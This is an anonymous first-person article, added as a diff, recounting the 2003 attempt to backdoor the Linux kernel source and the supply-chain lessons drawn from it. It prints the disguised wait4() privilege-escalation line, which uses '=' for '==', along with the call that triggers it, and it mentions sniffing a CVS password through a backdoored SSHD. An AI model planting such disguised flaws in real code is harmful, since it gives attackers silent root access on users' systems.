@@ -1,0 +1,143 @@
+---
+title: HISTORY: The 2003 Linux Kernel Backdoor
+author: Anonymous
+---
+|=-----------------------------------------------------------------------=|
+|=-----------------=[ The 2003 Linux Kernel Backdoor ]=------------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------------------=[ Anonymous ]=----------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+Nobody was ever identified for this attack. This is the first and likely
+only public confession by a hacker who was involved.
+
+                               -----
+
+This is how the story should start: I am sorry - for having caused any
+distress or concern. 
+
+https://www.theregister.com/2003/11/07/linux_kernel_backdoor_blocked/
+
+Truth be told, I didn't feel sorry back then. We were kids. The Internet
+was small. We fooled around. We never meant to harm anyone. We were just
+there for the intellectual challenge. A sport.
+
+So, it was just past midnight, maybe 2am (German time). My phone buzzes.
+Ignoring it once...twice...but the third time I glance at the screen. A
+number from the US. I knew the number. A fellow hacker.
+
+I didn't pick up. I didn't have to. He would not have said anything on the
+phone anyway. Phones were not safe. Big brother was always listening (or so
+we assumed). This was just him wanting me to "WAKE UP & CHECK IRC".
+
+I did. Immediately. Secure IRC server (ircsnet). Thank you SSL.
+The conversation was brief. It was something like this:
+
+<me> re
+<yyy> w0rd
+<yyy> Need a stealthy Linux Kernel Backdoor. It's urgent. Backdoor for the
+      source code. Need to be small. Unsuspicious. Can you? How big will it
+      be? HAS TO BE SMALL!
+<me> How soon?
+<yyy> 2h? It's urgent.
+<me> Can't do remote + small + testing in 2h. Local root via kernel ok?
+<yyy> sure?
+<me> Ok. I'll check the Linux Kernel Source and get back to you.
+<yyy> w0rd
+<me> w0rd
+
+First half an hour I spent drinking coffee and forming a plan in my head:
+
+  "wtf" ... "hmm. should be a syscall. Least code change" 
+      "wtf" ... "2h? darn"
+         "wtf" ... "ok. I need more coffee & sugar"
+  "ok ok ok" ... "Let's go for a syscall."
+  "Backdoor must look harmless and survive source code review. Ulg!"
+
+  ....reading code like a mad man. The clock ticks to 3am. No code
+  produced yet. 1h left until deadline.
+
+Can't let friends down. Need more coffee.
+
+Let's use a syscall that's seldom used. wait4() looks promising. Takes
+some special parameters that no normal program would ever use by accident.
+
+kernel/exit.c in the wait4() syscall contains some sanity checks at the
+start of the function: A series of if-statements checking that the calling
+process is allowed to make this call and that the parameters make sense.
+
+I added an additional if-statement (2 lines):
+
+if ((options == (__WCLONE|__WALL)) && (current->uid = 0))
+    return -EINVAL;
+
+Compiles without warning. Can you see the backdoor? Tiny source changes can
+have major security implications.
+
+Yes, "current->uid = 0" instead of "current->uid == 0". The former does not
+check if the UID is zero but instead _changes_ the uid of the process to
+zero.
+
+A Kernel Level b00m shell. Any process calling
+
+"wait4(0, NULL, __WCLONE|__WALL, NULL);"
+
+would get root privileges. 
+
+I sent my patch to my friend and I go to sleep. I wake up and see the
+Linux Kernel Mailinglist on fire.
+
+What did we do wrong? How did they find out?
+
+We had to wait for the public press release to find out:
+
+Larry McVoy (BitKeeper's author) kept a master copy of the Linux Kernel
+Source code and tracked the checksums of every commit. I salute his
+paranoia. Our modification triggered a mismatch. Some other developer then
+noticed that "=" is not the same as "==".
+
+Yes, indeed, it is not.
+
+We tried. We failed. You won.
+
+We were sad but also glad you found out - but you almost didn't. This was
+us, a bunch of kids, between 2am and 4am.
+
+History was made (for both sides).
+
+A Zeitwende. Before 2003, many developers focused primarily on writing
+secure code and not on their own infrastructure. The attitude back then was
+much like "hacking incidents only happen to others" and "we know better".
+
+The password to the CVS server was 4 letters followed by 2-3 digits or so
+(sniffed via a backdoored SSHD running on the shell server that was used by
+the developers to access the Linux Kernel CVS).
+
+A shift in mindset happened. Nobody is immune to attacks.
+
+You now call it "software supply chain security".
+
+Linus Torvalds eventually developed Git (2005) — where every commit is
+cryptographically hashed, making this kind of silent tampering detectable
+by design.
+
+Password security has improved.
+
+I'm glad about this outcome. I'm glad it was us who took you for a ride and
+not some APT.
+
+
+You are welcome,
+
+The Scene
+p.s. Developers and admins are still using SSH to connect from server to
+server - "they know better" still, and "backdoored SSHD only happen to the
+others", I presume.
+
+[1] https://lwn.net/Articles/57135/
+[2] https://blog.citp.princeton.edu/2013/10/09/the-linux-backdoor-attempt-of-2003/
+[3] https://www.linux.com/news/linux-kernel-development-process-thwarts-subversion-attempt/
+[4] https://linux.slashdot.org/story/03/11/06/058249/linux-kernel-back-door-hack-attempt-discovered
+
+|=[ EOF ]=---------------------------------------------------------------=|
